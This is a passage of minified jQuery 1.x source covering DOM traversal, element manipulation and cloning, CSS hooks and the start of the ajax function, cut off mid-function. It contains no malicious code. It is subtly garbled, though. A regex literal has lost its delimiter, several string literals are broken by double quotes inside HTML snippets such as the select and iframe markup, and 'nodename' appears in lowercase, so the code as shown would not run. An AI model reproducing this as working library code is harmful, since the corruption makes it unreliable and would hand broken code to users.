x().off(e),s.apply(this,arguments)},i.guid=s.guid||(s.guid=x.guid++)),this.each(function(){x.event.add(this,e,i,r,n)})},one:function(e,t,n,r){return this.on(e,t,n,r,1)},off:function(e,n,r){var i,o;if(e&&e.preventDefault&&e.handleObj)return i=e.handleObj,x(e.delegateTarget).off(i.namespace?i.origType+"."+i.namespace:i.origType,i.selector,i.handler),this;if("object"==typeof e){for(o in e)this.off(o,n,e[o]);return this}return(n===!1||"function"==typeof n)&&(r=n,n=t),r===!1&&(r=ot),this.each(function(){x.event.remove(this,e,r,n)})},trigger:function(e,t){return this.each(function(){x.event.trigger(e,t,this)})},triggerHandler:function(e,n){var r=this[0];return r?x.event.trigger(e,n,r,!0):t}});var st=/^.[^:#\[\.,]*$/,lt=/^(?:parents|prev(?:Until|All))/,ut=x.expr.match.needsContext,ct={children:!0,contents:!0,next:!0,prev:!0};x.fn.extend({find:function(e){var t,n=[],r=this,i=r.length;if("string"!=typeof e)return this.pushStack(x(e).filter(function(){for(t=0;i>t;t++)if(x.contains(r[t],this))return!0}));for(t=0;i>t;t++)x.find(e,r[t],n);return n=this.pushStack(i>1?x.unique(n):n),n.selector=this.selector?this.selector+" "+e:e,n},has:function(e){var t,n=x(e,this),r=n.length;return this.filter(function(){for(t=0;r>t;t++)if(x.contains(this,n[t]))return!0})},not:function(e){return this.pushStack(ft(this,e||[],!0))},filter:function(e){return this.pushStack(ft(this,e||[],!1))},is:function(e){return!!ft(this,"string"==typeof e&&ut.test(e)?x(e):e||[],!1).length},closest:function(e,t){var n,r=0,i=this.length,o=[],a=ut.test(e)||"string"!=typeof e?x(e,t||this.context):0;for(;i>r;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(11>n.nodeType&&(a?a.index(n)>-1:1===n.nodeType&&x.find.matchesSelector(n,e))){n=o.push(n);break}return this.pushStack(o.length>1?x.unique(o):o)},index:function(e){return e?"string"==typeof e?x.inArray(this[0],x(e)):x.inArray(e.jquery?e[0]:e,this):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){var n="string"==typeof e?x(e,t):x.makeArray(e&&e.nodeType?[e]:e),r=x.merge(this.get(),n);return this.pushStack(x.unique(r))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}});function pt(e,t){do e=e[t];while(e&&1!==e.nodeType);return e}x.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return x.dir(e,"parentNode")},parentsUntil:function(e,t,n){return x.dir(e,"parentNode",n)},next:function(e){return pt(e,"nextSibling")},prev:function(e){return pt(e,"previousSibling")},nextAll:function(e){return x.dir(e,"nextSibling")},prevAll:function(e){return x.dir(e,"previousSibling")},nextUntil:function(e,t,n){return x.dir(e,"nextSibling",n)},prevUntil:function(e,t,n){return x.dir(e,"previousSibling",n)},siblings:function(e){return x.sibling((e.parentNode||{}).firstChild,e)},children:function(e){return x.sibling(e.firstChild)},contents:function(e){return x.nodeName(e,"iframe")?e.contentDocument||e.contentWindow.document:x.merge([],e.childNodes)}},function(e,t){x.fn[e]=function(n,r){var i=x.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(i=x.filter(r,i)),this.length>1&&(ct[e]||(i=x.unique(i)),lt.test(e)&&(i=i.reverse())),this.pushStack(i)}}),x.extend({filter:function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?x.find.matchesSelector(r,e)?[r]:[]:x.find.matches(e,x.grep(t,function(e){return 1===e.nodeType}))},dir:function(e,n,r){var i=[],o=e[n];while(o&&9!==o.nodeType&&(r===t||1!==o.nodeType||!x(o).is(r)))1===o.nodeType&&i.push(o),o=o[n];return i},sibling:function(e,t){var n=[];for(;e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n}});function ft(e,t,n){if(x.isFunction(t))return x.grep(e,function(e,r){return!!t.call(e,r,e)!==n});if(t.nodeType)return x.grep(e,function(e){return e===t!==n});if("string"==typeof t){if(st.test(t))return x.filter(t,e,n);t=x.filter(t,e)}return x.grep(e,function(e){return x.inArray(e,t)>=0!==n})}function dt(e){var t=ht.split("|"),n=e.createDocumentFragment();if(n.createElement)while(t.length)n.createElement(t.pop());return n}var ht="abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",gt=/ jQuery\d+="(?:null|\d+)"/g,mt=RegExp("<(?:"+ht+")[\\s>]","i"),yt=/^\s+/,vt=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,bt=/<([\w:]+) ,xt="/<tbody/i,wt=/<|&#?\w+;/,Tt=/<(?:script|style|link)/i,Ct=/^(?:checkbox|radio)$/i,Nt=/checked\s*(?:[^=]|=\s*.checked.)/i,kt=/^$|\/(?:java|ecma)script/i,Et=/^true\/(.*)/,St=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)">\s*$/g,At={option:[1,"<select multiple="multiple">","</select>"],legend:[1,"<fieldset>","</fieldset>"],area:[1,"<map>","</map>"],param:[1,"<object>","</object>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:x.support.htmlSerialize?[0,"",""]:[1,"X<div>","</div>"]},jt=dt(a),Dt=jt.appendChild(a.createElement("div"));At.optgroup=At.option,At.tbody=At.tfoot=At.colgroup=At.caption=At.thead,At.th=At.td,x.fn.extend({text:function(e){return x.access(this,function(e){return e===t?x.text(this):this.empty().append((this[0]&&this[0].ownerDocument||a).createTextNode(e))},null,e,arguments.length)},append:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Lt(this,e);t.appendChild(e)}})},prepend:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Lt(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},remove:function(e,t){var n,r=e?x.filter(e,this):this,i=0;for(;null!=(n=r[i]);i++)t||1!==n.nodeType||x.cleanData(Ft(n)),n.parentNode&&(t&&x.contains(n.ownerDocument,n)&&_t(Ft(n,"script")),n.parentNode.removeChild(n));return this},empty:function(){var e,t=0;for(;null!=(e=this[t]);t++){1===e.nodeType&&x.cleanData(Ft(e,!1));while(e.firstChild)e.removeChild(e.firstChild);e.options&&x.nodeName(e,"select")&&(e.options.length=0)}return this},clone:function(e,t){return e=null==e?!1:e,t=null==t?e:t,this.map(function(){return x.clone(this,e,t)})},html:function(e){return x.access(this,function(e){var n=this[0]||{},r=0,i=this.length;if(e===t)return 1===n.nodeType?n.innerHTML.replace(gt,""):t;if(!("string"!=typeof e||Tt.test(e)||!x.support.htmlSerialize&&mt.test(e)||!x.support.leadingWhitespace&&yt.test(e)||At[(bt.exec(e)||["",""])[1].toLowerCase()])){e=e.replace(vt,"<$1>");try{for(;i>r;r++)n=this[r]||{},1===n.nodeType&&(x.cleanData(Ft(n,!1)),n.innerHTML=e);n=0}catch(o){}}n&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=x.map(this,function(e){return[e.nextSibling,e.parentNode]}),t=0;return this.domManip(arguments,function(n){var r=e[t++],i=e[t++];i&&(r&&r.parentNode!==i&&(r=this.nextSibling),x(this).remove(),i.insertBefore(n,r))},!0),t?this:this.remove()},detach:function(e){return this.remove(e,!0)},domManip:function(e,t,n){e=d.apply([],e);var r,i,o,a,s,l,u=0,c=this.length,p=this,f=c-1,h=e[0],g=x.isFunction(h);if(g||!(1>=c||"string"!=typeof h||x.support.checkClone)&&Nt.test(h))return this.each(function(r){var i=p.eq(r);g&&(e[0]=h.call(this,r,i.html())),i.domManip(e,t,n)});if(c&&(l=x.buildFragment(e,this[0].ownerDocument,!1,!n&&this),r=l.firstChild,1===l.childNodes.length&&(l=r),r)){for(a=x.map(Ft(l,"script"),Ht),o=a.length;c>u;u++)i=l,u!==f&&(i=x.clone(i,!0,!0),o&&x.merge(a,Ft(i,"script"))),t.call(this[u],i,u);if(o)for(s=a[a.length-1].ownerDocument,x.map(a,qt),u=0;o>u;u++)i=a[u],kt.test(i.type||"")&&!x._data(i,"globalEval")&&x.contains(s,i)&&(i.src?x._evalUrl(i.src):x.globalEval((i.text||i.textContent||i.innerHTML||"").replace(St,"")));l=r=null}return this}});function Lt(e,t){return x.nodeName(e,"table")&&x.nodeName(1===t.nodeType?t:t.firstChild,"tr")?e.getElementsByTagName("tbody")[0]||e.appendChild(e.ownerDocument.createElement("tbody")):e}function Ht(e){return e.type=(null!==x.find.attr(e,"type"))+"/"+e.type,e}function qt(e){var t=Et.exec(e.type);return t?e.type=t[1]:e.removeAttribute("type"),e}function _t(e,t){var n,r=0;for(;null!=(n=e[r]);r++)x._data(n,"globalEval",!t||x._data(t[r],"globalEval"))}function Mt(e,t){if(1===t.nodeType&&x.hasData(e)){var n,r,i,o=x._data(e),a=x._data(t,o),s=o.events;if(s){delete a.handle,a.events={};for(n in s)for(r=0,i=s[n].length;i>r;r++)x.event.add(t,n,s[n][r])}a.data&&(a.data=x.extend({},a.data))}}function Ot(e,t){var n,r,i;if(1===t.nodeType){if(n=t.nodeName.toLowerCase(),!x.support.noCloneEvent&&t[x.expando]){i=x._data(t);for(r in i.events)x.removeEvent(t,r,i.handle);t.removeAttribute(x.expando)}"script"===n&&t.text!==e.text?(Ht(t).text=e.text,qt(t)):"object"===n?(t.parentNode&&(t.outerHTML=e.outerHTML),x.support.html5Clone&&e.innerHTML&&!x.trim(t.innerHTML)&&(t.innerHTML=e.innerHTML)):"input"===n&&Ct.test(e.type)?(t.defaultChecked=t.checked=e.checked,t.value!==e.value&&(t.value=e.value)):"option"===n?t.defaultSelected=t.selected=e.defaultSelected:("input"===n||"textarea"===n)&&(t.defaultValue=e.defaultValue)}}x.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){x.fn[e]=function(e){var n,r=0,i=[],o=x(e),a=o.length-1;for(;a>=r;r++)n=r===a?this:this.clone(!0),x(o[r])[t](n),h.apply(i,n.get());return this.pushStack(i)}});function Ft(e,n){var r,o,a=0,s=typeof e.getElementsByTagName!==i?e.getElementsByTagName(n||"*"):typeof e.querySelectorAll!==i?e.querySelectorAll(n||"*"):t;if(!s)for(s=[],r=e.childNodes||e;null!=(o=r[a]);a++)!n||x.nodeName(o,n)?s.push(o):x.merge(s,Ft(o,n));return n===t||n&&x.nodeName(e,n)?x.merge([e],s):s}function Bt(e){Ct.test(e.type)&&(e.defaultChecked=e.checked)}x.extend({clone:function(e,t,n){var r,i,o,a,s,l=x.contains(e.ownerDocument,e);if(x.support.html5Clone||x.isXMLDoc(e)||!mt.test("<"+e.nodename+">")?o=e.cloneNode(!0):(Dt.innerHTML=e.outerHTML,Dt.removeChild(o=Dt.firstChild)),!(x.support.noCloneEvent&&x.support.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||x.isXMLDoc(e)))for(r=Ft(o),s=Ft(e),a=0;null!=(i=s[a]);++a)r[a]&&Ot(i,r[a]);if(t)if(n)for(s=s||Ft(e),r=r||Ft(o),a=0;null!=(i=s[a]);a++)Mt(i,r[a]);else Mt(e,o);return r=Ft(o,"script"),r.length>0&&_t(r,!l&&Ft(e,"script")),r=s=i=null,o},buildFragment:function(e,t,n,r){var i,o,a,s,l,u,c,p=e.length,f=dt(t),d=[],h=0;for(;p>h;h++)if(o=e[h],o||0===o)if("object"===x.type(o))x.merge(d,o.nodeType?[o]:o);else if(wt.test(o)){s=s||f.appendChild(t.createElement("div")),l=(bt.exec(o)||["",""])[1].toLowerCase(),c=At[l]||At._default,s.innerHTML=c[1]+o.replace(vt,"<$1>")+c[2],i=c[0];while(i--)s=s.lastChild;if(!x.support.leadingWhitespace&&yt.test(o)&&d.push(t.createTextNode(yt.exec(o)[0])),!x.support.tbody){o="table"!==l||xt.test(o)?"<table>"!==c[1]||xt.test(o)?0:s:s.firstChild,i=o&&o.childNodes.length;while(i--)x.nodeName(u=o.childNodes[i],"tbody")&&!u.childNodes.length&&o.removeChild(u)}x.merge(d,s.childNodes),s.textContent="";while(s.firstChild)s.removeChild(s.firstChild);s=f.lastChild}else d.push(t.createTextNode(o));s&&f.removeChild(s),x.support.appendChecked||x.grep(Ft(d,"input"),Bt),h=0;while(o=d[h++])if((!r||-1===x.inArray(o,r))&&(a=x.contains(o.ownerDocument,o),s=Ft(f.appendChild(o),"script"),a&&_t(s),n)){i=0;while(o=s[i++])kt.test(o.type||"")&&n.push(o)}return s=null,f},cleanData:function(e,t){var n,r,o,a,s=0,l=x.expando,u=x.cache,c=x.support.deleteExpando,f=x.event.special;for(;null!=(n=e[s]);s++)if((t||x.acceptData(n))&&(o=n[l],a=o&&u[o])){if(a.events)for(r in a.events)f[r]?x.event.remove(n,r):x.removeEvent(n,r,a.handle);u[o]&&(delete u[o],c?delete n[l]:typeof n.removeAttribute!==i?n.removeAttribute(l):n[l]=null,p.push(o))}},_evalUrl:function(e){return x.ajax({url:e,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})}}),x.fn.extend({wrapAll:function(e){if(x.isFunction(e))return this.each(function(t){x(this).wrapAll(e.call(this,t))});if(this[0]){var t=x(e,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstChild&&1===e.firstChild.nodeType)e=e.firstChild;return e}).append(this)}return this},wrapInner:function(e){return x.isFunction(e)?this.each(function(t){x(this).wrapInner(e.call(this,t))}):this.each(function(){var t=x(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=x.isFunction(e);return this.each(function(n){x(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(){return this.parent().each(function(){x.nodeName(this,"body")||x(this).replaceWith(this.childNodes)}).end()}});var Pt,Rt,Wt,$t=/alpha\([^)]*\)/i,It=/opacity\s*=\s*([^)]*)/,zt=/^(top|right|bottom|left)$/,Xt=/^(none|table(?!-c[ea]).+)/,Ut=/^margin/,Vt=RegExp("^("+w+")(.*)$","i"),Yt=RegExp("^("+w+")(?!px)[a-z%]+$","i"),Jt=RegExp("^([+-])=("+w+")","i"),Gt={BODY:"block"},Qt={position:"absolute",visibility:"hidden",display:"block"},Kt={letterSpacing:0,fontWeight:400},Zt=["Top","Right","Bottom","Left"],en=["Webkit","O","Moz","ms"];function tn(e,t){if(t in e)return t;var n=t.charAt(0).toUpperCase()+t.slice(1),r=t,i=en.length;while(i--)if(t=en[i]+n,t in e)return t;return r}function nn(e,t){return e=t||e,"none"===x.css(e,"display")||!x.contains(e.ownerDocument,e)}function rn(e,t){var n,r,i,o=[],a=0,s=e.length;for(;s>a;a++)r=e[a],r.style&&(o[a]=x._data(r,"olddisplay"),n=r.style.display,t?(o[a]||"none"!==n||(r.style.display=""),""===r.style.display&&nn(r)&&(o[a]=x._data(r,"olddisplay",ln(r.nodeName)))):o[a]||(i=nn(r),(n&&"none"!==n||!i)&&x._data(r,"olddisplay",i?n:x.css(r,"display"))));for(a=0;s>a;a++)r=e[a],r.style&&(t&&"none"!==r.style.display&&""!==r.style.display||(r.style.display=t?o[a]||"":"none"));return e}x.fn.extend({css:function(e,n){return x.access(this,function(e,n,r){var i,o,a={},s=0;if(x.isArray(n)){for(o=Rt(e),i=n.length;i>s;s++)a[n[s]]=x.css(e,n[s],!1,o);return a}return r!==t?x.style(e,n,r):x.css(e,n)},e,n,arguments.length>1)},show:function(){return rn(this,!0)},hide:function(){return rn(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){nn(this)?x(this).show():x(this).hide()})}}),x.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=Wt(e,"opacity");return""===n?"1":n}}}},cssNumber:{columnCount:!0,fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":x.support.cssFloat?"cssFloat":"styleFloat"},style:function(e,n,r,i){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var o,a,s,l=x.camelCase(n),u=e.style;if(n=x.cssProps[l]||(x.cssProps[l]=tn(u,l)),s=x.cssHooks[n]||x.cssHooks[l],r===t)return s&&"get"in s&&(o=s.get(e,!1,i))!==t?o:u[n];if(a=typeof r,"string"===a&&(o=Jt.exec(r))&&(r=(o[1]+1)*o[2]+parseFloat(x.css(e,n)),a="number"),!(null==r||"number"===a&&isNaN(r)||("number"!==a||x.cssNumber[l]||(r+="px"),x.support.clearCloneStyle||""!==r||0!==n.indexOf("background")||(u[n]="inherit"),s&&"set"in s&&(r=s.set(e,r,i))===t)))try{u[n]=r}catch(c){}}},css:function(e,n,r,i){var o,a,s,l=x.camelCase(n);return n=x.cssProps[l]||(x.cssProps[l]=tn(e.style,l)),s=x.cssHooks[n]||x.cssHooks[l],s&&"get"in s&&(a=s.get(e,!0,r)),a===t&&(a=Wt(e,n,i)),"normal"===a&&n in Kt&&(a=Kt[n]),""===r||r?(o=parseFloat(a),r===!0||x.isNumeric(o)?o||0:a):a}}),e.getComputedStyle?(Rt=function(t){return e.getComputedStyle(t,null)},Wt=function(e,n,r){var i,o,a,s=r||Rt(e),l=s?s.getPropertyValue(n)||s[n]:t,u=e.style;return s&&(""!==l||x.contains(e.ownerDocument,e)||(l=x.style(e,n)),Yt.test(l)&&Ut.test(n)&&(i=u.width,o=u.minWidth,a=u.maxWidth,u.minWidth=u.maxWidth=u.width=l,l=s.width,u.width=i,u.minWidth=o,u.maxWidth=a)),l}):a.documentElement.currentStyle&&(Rt=function(e){return e.currentStyle},Wt=function(e,n,r){var i,o,a,s=r||Rt(e),l=s?s[n]:t,u=e.style;return null==l&&u&&u[n]&&(l=u[n]),Yt.test(l)&&!zt.test(n)&&(i=u.left,o=e.runtimeStyle,a=o&&o.left,a&&(o.left=e.currentStyle.left),u.left="fontSize"===n?"1em":l,l=u.pixelLeft+"px",u.left=i,a&&(o.left=a)),""===l?"auto":l});function on(e,t,n){var r=Vt.exec(t);return r?Math.max(0,r[1]-(n||0))+(r[2]||"px"):t}function an(e,t,n,r,i){var o=n===(r?"border":"content")?4:"width"===t?1:0,a=0;for(;4>o;o+=2)"margin"===n&&(a+=x.css(e,n+Zt[o],!0,i)),r?("content"===n&&(a-=x.css(e,"padding"+Zt[o],!0,i)),"margin"!==n&&(a-=x.css(e,"border"+Zt[o]+"Width",!0,i))):(a+=x.css(e,"padding"+Zt[o],!0,i),"padding"!==n&&(a+=x.css(e,"border"+Zt[o]+"Width",!0,i)));return a}function sn(e,t,n){var r=!0,i="width"===t?e.offsetWidth:e.offsetHeight,o=Rt(e),a=x.support.boxSizing&&"border-box"===x.css(e,"boxSizing",!1,o);if(0>=i||null==i){if(i=Wt(e,t,o),(0>i||null==i)&&(i=e.style[t]),Yt.test(i))return i;r=a&&(x.support.boxSizingReliable||i===e.style[t]),i=parseFloat(i)||0}return i+an(e,t,n||(a?"border":"content"),r,o)+"px"}function ln(e){var t=a,n=Gt[e];return n||(n=un(e,t),"none"!==n&&n||(Pt=(Pt||x("<iframe frameborder="0" width="0" height="0">").css("cssText","display:block !important")).appendTo(t.documentElement),t=(Pt[0].contentWindow||Pt[0].contentDocument).document,t.write("<!doctype html><html><body>"),t.close(),n=un(e,t),Pt.detach()),Gt[e]=n),n}function un(e,t){var n=x(t.createElement(e)).appendTo(t.body),r=x.css(n[0],"display");return n.remove(),r}x.each(["height","width"],function(e,n){x.cssHooks[n]={get:function(e,r,i){return r?0===e.offsetWidth&&Xt.test(x.css(e,"display"))?x.swap(e,Qt,function(){return sn(e,n,i)}):sn(e,n,i):t},set:function(e,t,r){var i=r&&Rt(e);return on(e,t,r?an(e,n,r,x.support.boxSizing&&"border-box"===x.css(e,"boxSizing",!1,i),i):0)}}}),x.support.opacity||(x.cssHooks.opacity={get:function(e,t){return It.test((t&&e.currentStyle?e.currentStyle.filter:e.style.filter)||"")?.01*parseFloat(RegExp.$1)+"":t?"1":""},set:function(e,t){var n=e.style,r=e.currentStyle,i=x.isNumeric(t)?"alpha(opacity="+100*t+")":"",o=r&&r.filter||n.filter||"";n.zoom=1,(t>=1||""===t)&&""===x.trim(o.replace($t,""))&&n.removeAttribute&&(n.removeAttribute("filter"),""===t||r&&!r.filter)||(n.filter=$t.test(o)?o.replace($t,i):o+" "+i)}}),x(function(){x.support.reliableMarginRight||(x.cssHooks.marginRight={get:function(e,n){return n?x.swap(e,{display:"inline-block"},Wt,[e,"marginRight"]):t}}),!x.support.pixelPosition&&x.fn.position&&x.each(["top","left"],function(e,n){x.cssHooks[n]={get:function(e,r){return r?(r=Wt(e,n),Yt.test(r)?x(e).position()[n]+"px":r):t}}})}),x.expr&&x.expr.filters&&(x.expr.filters.hidden=function(e){return 0>=e.offsetWidth&&0>=e.offsetHeight||!x.support.reliableHiddenOffsets&&"none"===(e.style&&e.style.display||x.css(e,"display"))},x.expr.filters.visible=function(e){return!x.expr.filters.hidden(e)}),x.each({margin:"",padding:"",border:"Width"},function(e,t){x.cssHooks[e+t]={expand:function(n){var r=0,i={},o="string"==typeof n?n.split(" "):[n];for(;4>r;r++)i[e+Zt[r]+t]=o[r]||o[r-2]||o[0];return i}},Ut.test(e)||(x.cssHooks[e+t].set=on)});var cn=/%20/g,pn=/\[\]$/,fn=/\r?\n/g,dn=/^(?:submit|button|image|reset|file)$/i,hn=/^(?:input|select|textarea|keygen)/i;x.fn.extend({serialize:function(){return x.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=x.prop(this,"elements");return e?x.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!x(this).is(":disabled")&&hn.test(this.nodeName)&&!dn.test(e)&&(this.checked||!Ct.test(e))}).map(function(e,t){var n=x(this).val();return null==n?null:x.isArray(n)?x.map(n,function(e){return{name:t.name,value:e.replace(fn,"\r\n")}}):{name:t.name,value:n.replace(fn,"\r\n")}}).get()}}),x.param=function(e,n){var r,i=[],o=function(e,t){t=x.isFunction(t)?t():null==t?"":t,i[i.length]=encodeURIComponent(e)+"="+encodeURIComponent(t)};if(n===t&&(n=x.ajaxSettings&&x.ajaxSettings.traditional),x.isArray(e)||e.jquery&&!x.isPlainObject(e))x.each(e,function(){o(this.name,this.value)});else for(r in e)gn(r,e[r],n,o);return i.join("&").replace(cn,"+")};function gn(e,t,n,r){var i;if(x.isArray(t))x.each(t,function(t,i){n||pn.test(e)?r(e,i):gn(e+"["+("object"==typeof i?t:"")+"]",i,n,r)});else if(n||"object"!==x.type(t))r(e,t);else for(i in t)gn(e+"["+i+"]",t[i],n,r)}x.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(e,t){x.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),x.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)},bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}});var mn,yn,vn=x.now(),bn=/\?/,xn=/#.*$/,wn=/([?&])_=[^&]*/,Tn=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,Cn=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Nn=/^(?:GET|HEAD)$/,kn=/^\/\//,En=/^([\w.+-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/,Sn=x.fn.load,An={},jn={},Dn="*/".concat("*");try{yn=o.href}catch(Ln){yn=a.createElement("a"),yn.href="",yn=yn.href}mn=En.exec(yn.toLowerCase())||[];function Hn(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var r,i=0,o=t.toLowerCase().match(T)||[];if(x.isFunction(n))while(r=o[i++])"+"===r[0]?(r=r.slice(1)||"*",(e[r]=e[r]||[]).unshift(n)):(e[r]=e[r]||[]).push(n)}}function qn(e,n,r,i){var o={},a=e===jn;function s(l){var u;return o[l]=!0,x.each(e[l]||[],function(e,l){var c=l(n,r,i);return"string"!=typeof c||a||o[c]?a?!(u=c):t:(n.dataTypes.unshift(c),s(c),!1)}),u}return s(n.dataTypes[0])||!o["*"]&&s("*")}function _n(e,n){var r,i,o=x.ajaxSettings.flatOptions||{};for(i in n)n[i]!==t&&((o[i]?e:r||(r={}))[i]=n[i]);return r&&x.extend(!0,e,r),e}x.fn.load=function(e,n,r){if("string"!=typeof e&&Sn)return Sn.apply(this,arguments);var i,o,a,s=this,l=e.indexOf(" ");return l>=0&&(i=e.slice(l,e.length),e=e.slice(0,l)),x.isFunction(n)?(r=n,n=t):n&&"object"==typeof n&&(a="POST"),s.length>0&&x.ajax({url:e,type:a,dataType:"html",data:n}).done(function(e){o=arguments,s.html(i?x("<div>").append(x.parseHTML(e)).find(i):e)}).complete(r&&function(e,t){s.each(r,o||[e.responseText,t,e])}),this},x.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){x.fn[t]=function(e){return this.on(t,e)}}),x.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:yn,type:"GET",isLocal:Cn.test(mn[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Dn,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":x.parseJSON,"text xml":x.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?_n(_n(e,x.ajaxSettings),t):_n(x.ajaxSettings,e)},ajaxPrefilter:Hn(An),ajaxTransport:Hn(jn),ajax:function(e,n){"object"==typeof e&&(n=e,e=t),n=n||{};var r,i,o,a,s,l,u,c,p=x.ajaxSetup({},n),f=p.context||p,d=p.context&&(f.nodeType||f.jquery)?x(f):x.event,h=x.Deferred(),g=x.Callbacks("once memory"),m=p.statusCode||{},y={},v={},b=0,w="canceled",C={readyState:0,getResponseHeader:function(e){var t;if(2===b){if(!c){c={};while(t=Tn.exec(a))c[t[1].toLowerCase()]=t[2]}t=c[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return 2===b?a:null},setRequestHeader:function(e,t){var n=e.toLowerCase();return b||(e=v[n]=v[n]||e,y[e]=t),this},overrideMimeType:function(e){return b||(p.mimeType=e),this},statusCode:function(e){var t;if(e)if(2>b)for(t in e)m[t]=[m[t],e[t]];else C.always(e[C.status]);return this},abort:function(e){var t=e||w;return u&&u.abort(t),k(0,t),this}};if(h.promise(C).complete=g.add,C.success=C.done,C.error=C.fail,p.url=((e||p.url||yn)+"").replace(xn,"").replace(kn,mn[1]+"//"),p.type=n.method||n.type||p.method||p.type,p.dataTypes=x.trim(p.dataType||"*").toLowerCase().match(T)||[""],null==p.crossDomain&&(r=En.exec(p.url.toLowerCase()),p.crossDomain=!(!r||r[1]===mn[1]&&r[2]===mn[2]&&(r[3]||("http:"===r[1]?"80":"443"))===(mn[3]||("http:"===mn[1]?"80":"443")))),p.data&&p.processData&&"string"!=typeof p.data&&(p.data=x.param(p.data,p.traditional)),qn(An,p,n,C),2===b)return C;l=p.global,l&&0===x.active++&&x.event.trigger("ajaxStart"),p.type=p.type.toUpperCase(),p.hasContent=!Nn.test(p.type),o=p.url,p.hasContent||(p.data&&(o=p.url+=(bn.test(o)?"&":"?")+p.data,delete p.data),p.cache===!1&&(p.url=wn.test(o)?o.replace(wn,"$1_="+vn++):o+(bn.test(o)?"&":"?")+"_="+vn++)),p.ifModified&&(x.lastModified[o]&&C.setRequestHeader("If-Modified-Since",x.lastModified[o]),x.etag[o]&&C.setRequestHeader("If-None-Match",x.etag[o])),(p.data&&p.hasContent&&p.contentType!==!1||n.contentType)&&C.setRequestHeader("Content-Type",p.contentType),C.setRequestHeader("Accept",p.dataTypes[0]&&p.accepts[p.dataTypes[0]]?p.accepts[p.dataTypes[0]]+("*"!==p.dataTypes[0]?", "+Dn+"; q=0.01":""):p.accepts["*"]);for(i in p.headers)C.setRequestHeader(i,p.headers[i]);if(p.beforeSend&&(p.beforeSend.call(f,C,p)===!1||2===b))return C.abort();w="abort";for(i in{success:1,error:1,complete:1})C[i](p[i]);if(u=qn(jn,p,n,C)){C.readyState=1,l&&d.trigger("ajaxSend",[C,p]),p.async&&p.timeout>0&&(s=setTimeout(function(){C.abort("timeout")},p.timeout));try{b=1,u.send(y,k)}catch(N){if(!(2>b))throw N;k(-1,N)}}else k(-1,"No Transport");function k(e,n,r,i){var 